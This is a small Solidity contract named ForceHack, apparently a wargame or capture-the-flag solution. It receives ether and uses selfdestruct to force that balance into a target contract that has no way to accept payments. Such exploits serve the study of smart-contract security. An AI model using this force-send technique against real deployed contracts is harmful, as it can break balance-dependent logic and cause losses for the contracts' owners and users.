// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {

    function sendAndDestruct(address payable _to) public {
        selfdestruct(_to);
    }

    receive() external payable {}
}